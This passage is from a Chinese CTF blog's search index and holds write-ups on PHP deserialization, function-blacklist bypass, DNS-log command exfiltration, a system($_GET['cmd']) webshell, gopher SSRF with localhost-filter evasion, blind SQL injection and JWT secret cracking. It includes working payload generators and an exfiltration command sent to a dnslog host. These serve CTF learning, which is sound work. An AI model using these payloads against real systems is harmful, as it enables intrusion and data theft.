if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\n经过分析得知基本流程为定义op为操作数，1为写2为读，在读中分析，首先字符串通过GET以str引入，首先进行is_valid判断，判断是否存在不可打印字符，之后进行反序列化，在process函数中判断op为2调用read函数，读取文件名为变量filename的文件，将返回值赋值给res变量并调用output函数进行输出。\n\ndestruct魔术方法中会自动将op值由2转换为1，但比较类型为强比较，process函数中为弱类型比较，因此传入数字2即可绕过。\n\n构造对应脚本：\n\n```php\n<?php\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $this -> op = 2;\n        $this -> filename = \"flag.php\";\n        // $this -> content = \"Hello World!\";\n    }\n}\n$a = new FileHandler;\necho(urlencode(serialize($a)));\n?>\n```\n\n发现无任何回显，仔细观察流程发现由于类中的变量属性类型为**protected** ，因此序列化后形如：\n\n![protected](image-20230407210544120.png)\n\n发现在变量名称前出现了%00*%00，无法通过is_valid函数（同样的还有private属性类型，形式为%00类名%00字段名），这里有个小trick：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可\n\n```php\n<?php\nclass FileHandler {\n\n    public $op;\n    public $filename;\n    public $content;\n\n    function __construct() {\n        $this -> op = 2;\n        $this -> filename = \"flag.php\";\n        // $this -> content = \"Hello World!\";\n    }\n}\n$a = new FileHandler;\necho(urlencode(serialize($a)));\n?>\n```\n\n\n\n传入即可拿到flag。\n","tags":["CTF_解题记录"]},{"title":"CTFHub_2022-网鼎杯-朱雀组-phpweb","url":"/2023/04/07/CTFHub-2022-网鼎杯-朱雀组-phpweb/","content":"\n题目上来看到一张背景图，左上角显示实时时间，每5s刷新一次，通过burp查看POST传入了\n\n> func=date&p=Y-m-d%20h%3Ai%3As%20a\n\n猜测第一参数为php函数，第二参数为传入函数的参数。\n\n之后进行fuzz工作，发现ban掉了很多函数，像system、exec等函数均被ban掉，偶然发现highlight_file函数使用正常，可以借助此函数进行源码读取，传入\n\n> func=highlight_file&p=index.php\n\n成功拿到index.php的源码：\n\n```php\n<?php\n$disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\n\t\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",\n\t\"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\n\t\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"\n);\nfunction gettime($func, $p) {\n\t$result = call_user_func($func, $p);\n\t$a= gettype($result);\n\tif ($a == \"string\") {\n\treturn $result;\n\t} else {\n\treturn \"\";\n\t}\n}\nclass Test {\n\tvar $p = \"Y-m-d h:i:s a\";\n\tvar $func = \"date\";\n\tfunction __destruct() {\n\tif ($this->func != \"\") {\n\t\techo gettime($this->func, $this->p);\n\t}\n\t}\n}\n$func = $_REQUEST[\"func\"];\n$p = $_REQUEST[\"p\"];\nif ($func != null) {\n\t$func = strtolower($func);\n\tif (!in_array($func,$disable_fun)) {\n\techo gettime($func, $p);\n\t}else {\n\tdie(\"Hacker...\");\n\t}\n}\n?>\n```\n\n可以看到函数黑名单，审计发现可以利用Test类中的__destruct()魔术方法进行命令执行，从此逆推需要一个反序列化函数进行触发，发现unserialize函数不在黑名单中，可以利用，下面构造相应脚本：\n\n```php\n<?php\nclass Test {\n\tvar $p = \"cat /flag*\";\n\tvar $func = \"system\";\n}\n$a = new Test;\necho(urlencode(serialize($a)));\n?>\n```\n\n最终payload：\n\n> func=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A8%3A%22cat+%2Ffl%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n\n![flag](./image-20230407193913985.png)\n\n成功拿到flag。\n\n\n\n（加上解题记录要不没得写了qwq\n\n","tags":["CTF_解题记录"]},{"title":"VishwaCTF 2023 Web","url":"/2023/04/06/VishwaCTF-2023-Web/","content":"\n# Eeezzy\n\n题目上来直接给源码：\n\n![Eeezzy](./Eeezzy.png)\n\n利用了strcmp函数无法比较数组等其他类型的参数，因此传入数组会使函数出错退出返回NULL。当时同时构造username和password以数组形式传入仅仅只会报错，后来看别人wp发现需要只构造password以数组形式传入才能拿到wp？（一个坑点，本地环境测试两个都构造为数组形式也能拿到flag，后续有研究再补充）\n\n# aLive\n\n![alive题面](./image-20230406212435517.png)\n\n题面顾名思义，使用dnslog工具平台将命令外带，类似于requestbin\n\n![dnslog](./image-20230406213229616.png)\n\n如此，可通过如下构造将命令执行的结果进行外带：\n\n```she\n`whoami`.ks8zy9.dnslog.cn\n```\n\n![dnslog测试](./image-20230406213442239.png)\n\n```shell\n`cat flag*`.ks8zy9.dnslog.cn\n```\n\n拿到flag。\n\n# payload\n\n用dirsearch扫目录，能扫出robots.txt和一个奇怪的GET传参cmd的子目录（之后发现就是要传参cmd）,robots.txt内容：\n\n```php\n<?php\n    if(isset($_GET['cmd'])){\n        system($_GET['cmd']);\n    }\n    else {\n        if(isset($_GET['btn'])){\n            echo \"<b>System Details: </b>\";\n            system(\"uname -a\"); \n        }\n    }\n?>\n\n```\n\n之后测了很多，以为是ssrf之类的，fuzz发现屏蔽了一些系统函数，写webshell也会被自动清空。。。结果flag直接藏在环境变量里，使用命令env查看系统环境变量即可。\n\n![cmd=env](./image-20230406210722466.png)\n\n# spooky\n\n题目上来是个登录界面，使用dirsearch扫一遍目录，发现有一个sitemap.xml文件，文件包含两个文件的路径：\n\n- /creds/users.txt\n- /creds/pass.txt\n\n两个文件分别是一些用户名和密码，对应关系未知，使用burp的intruder模块的cluster bomb模式构造用户名和密码的笛卡尔积并爆破\n\n爆破发现shrekop用户能登陆成功，但权限等级为user，POST传入admin=true即可拿到flag\n\n\n\n### 写在最后\n\n赛后看题解真的不难。。。怎么比赛时候就短路？做题还是少\n","tags":["CTF_比赛记录"]},{"title":"2023数字中国数字人才赛道初赛WEB","url":"/2023/04/02/2023数字中国数字人才赛道初赛WEB/","content":"\n\n\n比赛时间在博客建站之前，题目没有自己截的图，在网上找了几张。\n\n# easy_curl\n\n首先通过php伪协议读取源文件\n\n``` \n?url=file:///var/www/html/index.php\n```\n\n得到index.php源码：\n\n![index.php源码](./image-20230402195715364.png)\n\n同理得到flag.php源码：\n\n![flag.php源码](./image-20230402195821748.png)\n\n通过源码分析可以得到基本逻辑，index.php负责进行过滤和curl访问，flag.php输出变量key和检测访问是否来源于本地，如果是则输出flag。\n\n题目重点在于：\n\n- gophar协议构造http请求\n\n- index.php对内网地址的过滤\n\n## gophar协议构造http请求：\n\n### 构造GET请求：\n\n使用脚本：\n\n```python\nimport urllib\ntest =\\\n\"\"\"GET /ssrf/get.php HTTP/1.1\nHost: 192.168.0.111\n\"\"\"  \ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://sudo.cc:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)\n```\n\n### 构造POST请求：\n\n包格式与GET不同，需要额外提供请求头Contennt-Type与Content-Length\n\n```python \nimport urllib.parse\npayload =\\\n\"\"\"POST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nkey=4208252604f16d7ed834c6bfceb54440\n\"\"\"  \ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://sudo.cc:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)       # 这里因为是GET请求所以要进行两次url编码\n```\n\n尤其要注意二次编码问题，因为最终利用index.php的curl时仍要urlencode\n\n## 本地地址过滤绕过\n\n正则表达式过滤了 **localhost、127.0开头的字符串以及中文句号。** 因此可以进行进制转换，例如127.0.0.1转换十进制为 2130706433，进行请求等同于127.0.0.1.\n\n另外一种方法可以访问**sudo.cc**，此域名在经过解析后为127.0.0.1，同样可以进行过滤绕过。\n\n最终payload：\n\n```\nhttp://80.endpoint-453973b83c7545d5a12aef2756506771.s.ins.cloud.dasctf.com:81/?url=gopher://2130706433:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%36%32%25%33%35%25%33%30%25%33%30%25%33%38%25%36%36%25%33%32%25%33%36%25%33%38%25%36%35%25%36%31%25%36%33%25%36%31%25%33%36%25%36%36%25%33%38%25%33%30%25%36%33%25%36%36%25%33%33%25%33%32%25%36%35%25%33%32%25%33%32%25%33%34%25%33%38%25%33%37%25%33%35%25%33%31%25%33%38%25%36%36%25%33%39\n```\n\n# Simple Message Board\n\nSQL注入，首先使用burp进行fuzz，发现substring函数被ban，使用left函数代替，left函数语法：\n\n```sql\nLEFT(str,length);\n```\n\n函数返回指定长度的字符串的左侧部分。\n\n经过测试注入点在search面板中，贴一个别人的脚本：\n\n```python\nimport requests,string\nurl = \"http://80.endpoint-8c456a973f5a40b1ad419af58b263ad3.s.ins.cloud.dasctf.com:81/index.php?act=search\"\nres =\"\"\nprint(string.printable)\nfor i in range(1,100):\n    print(i)\n    for j in \"0123456789abcdefghijklmnopqrstuvwxyz{}-\":\n        tmp=res\n        tmp+=j\n        payload1 = \"-1'||if((left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{})='{}'),1,0)#\".format(str(i),tmp)\n        payload1 = \"-1'||if((left((select*from(flag)),{})='{}'),1,0)#\".format(str(i),tmp)\n        #print(payload1)\n        #payload2 = \"admin'^(ascii(mid(database()from {}))>{})^1%23\".format(i,j)\n        data = {\"keyword\":payload1}\n        r = requests.post(url,data=data)\n        if \"Message:Hello, world!\"  in r.text:\n            res=tmp\n            print (res)\n            break\n        if \"What are you doing?\" in r.text:\n            print('Baned!')\n            exit()\n```\n\n脚本核心使用left函数对select到的内容进行截取，通过遍历的方式匹配到正确的字符。\n\n# 三体信息破译\n\n注册账号，在burp中能够看到cookie为jwt格式，在头部中可以看到加密方式为hs256，考虑进行暴力破解（没想到真能破解出来），使用工具c-jwt-cracker进行破解，docker运行\n\n```docker\ndocker run -it --rm jwtcrack [完整的jwt格式的一个样本]\n```\n\n得到密码为**izihz**\n\n登陆后会看到一长串关于网络安全的定义，很长所以很容易被人忽略（多用ctrl+f搜索一下关键词例如flag、hint之类，很有可能藏在看似无用的内容中），发现hint为使用用户名为“yewenjie”的用户进行登录，而jwt中有用户名字段：\n\n![JWT内容](./image-20230402210218768.png)\n\n将username改为yewenjie后利用破解出的密钥重新生成签名登录即可获得flag。\n\n## 写在最后：\n\n真的菜，差距真的大，多参加比赛，多刷题！\n\n","tags":["CTF_比赛记录"]}]